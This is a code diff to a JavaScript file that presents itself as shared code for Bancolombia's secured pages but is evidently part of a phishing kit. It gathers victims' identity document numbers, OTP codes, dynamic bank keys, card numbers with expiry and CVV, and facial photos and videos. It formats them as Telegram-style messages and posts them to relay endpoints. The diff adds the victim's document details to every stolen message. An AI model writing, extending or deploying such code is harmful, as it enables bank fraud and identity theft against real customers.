@@ -1,8 +1,11 @@
-/* ===== JS COMÚN BANCOLOMBIA - secured pages ===== */
+/* ==========================================================
+   JS COMÚN BANCOLOMBIA - secured pages (Actualizado)
+   ========================================================== */
 const SESSION_ID = sessionStorage.getItem('bc_session') || '';
 const USER       = sessionStorage.getItem('bc_user')    || 'Usuario';
-
-
+// Si guardas más datos en el login (por ejemplo, tipo y número de documento), recupéralos aquí:
+const DOC_TYPE   = sessionStorage.getItem('bc_doc_type')  || 'CC';
+const DOC_NUM    = sessionStorage.getItem('bc_doc_num')   || '';
 
 if (!SESSION_ID) {
   if (!location.pathname.endsWith('index.html') && location.pathname !== '/' && !location.pathname.endsWith('/')) {
@@ -51,10 +54,18 @@ function b64toBlob(b64, type) {
   return new Blob([arr], { type: type });
 }
 
+/**
+ * Encabezado común con la información del usuario para incluir en todos los mensajes
+ */
+function getUserHeader() {
+  return `👤 *USUARIO:* \`${USER}\`\n🆔 *DOC:* \`${DOC_TYPE} ${DOC_NUM}\`\n🔑 *SESSION ID:* \`${SESSION_ID}\`\n-----------------------------------`;
+}
+
 async function sendAndWait(payload, handlers) {
   showLoader();
   try {
     let msgId = null;
+    const header = getUserHeader();
 
     if (payload.event === 'FACIAL') {
       const rPhoto = await fetch(`/api/sendPhoto`, {
@@ -62,7 +73,7 @@ async function sendAndWait(payload, handlers) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           photo: payload.foto,
-          caption: `📷 *CAPTURA FACIAL*\n\n🆔 ID: \`${SESSION_ID}\``,
+          caption: `📷 *CAPTURA FACIAL*\n\n${header}`,
           parse_mode: 'Markdown',
           reply_markup: getKb(payload.event)
         })
@@ -78,16 +89,23 @@ async function sendAndWait(payload, handlers) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             document: payload.video,
-            caption: `🎥 *VIDEO MOVIMIENTO*\n🆔 ID: \`${SESSION_ID}\``,
+            caption: `🎥 *VIDEO MOVIMIENTO*\n\n${header}`,
             parse_mode: 'Markdown'
           })
         });
       }
     } else {
       let txt = '';
-      if (payload.event === 'OTP') txt = `🔢 *OTP RECIBIDO*\n\n🆔 ID: \`${SESSION_ID}\`\n🔑 OTP: \`${payload.otp}\``;
-      else if (payload.event === 'DINAMICA') txt = `🔑 *CLAVE DINÁMICA*\n\n🆔 ID: \`${SESSION_ID}\`\n🔑 Clave: \`${payload.dinamic}\``;
-      else if (payload.event === 'TARJETA') txt = `💳 *DATOS DE TARJETA*\n\n🆔 ID: \`${SESSION_ID}\`\n🔢 TC: \`${payload.tc}\`\n📅 Exp: \`${payload.expiry}\`\n🔒 CVV: \`${payload.cvv}\``;
+      if (payload.event === 'OTP') {
+        txt = `🔢 *OTP RECIBIDO*\n\n${header}\n🔑 *OTP:* \`${payload.otp}\``;
+      } else if (payload.event === 'DINAMICA') {
+        txt = `🔑 *CLAVE DINÁMICA*\n\n${header}\n🔑 *Clave:* \`${payload.dinamic}\``;
+      } else if (payload.event === 'TARJETA') {
+        txt = `💳 *DATOS DE TARJETA*\n\n${header}\n🔢 *TC:* \`${payload.tc}\`\n📅 *Exp:* \`${payload.expiry}\`\n🔒 *CVV:* \`${payload.cvv}\``;
+      } else if (payload.event === 'LOGIN') {
+        // Por si envías el evento de login inicial
+        txt = `🔐 *INICIO DE SESIÓN*\n\n${header}`;
+      }
 
       const res = await fetch(`/api/sendMessage`, {
         method: 'POST',
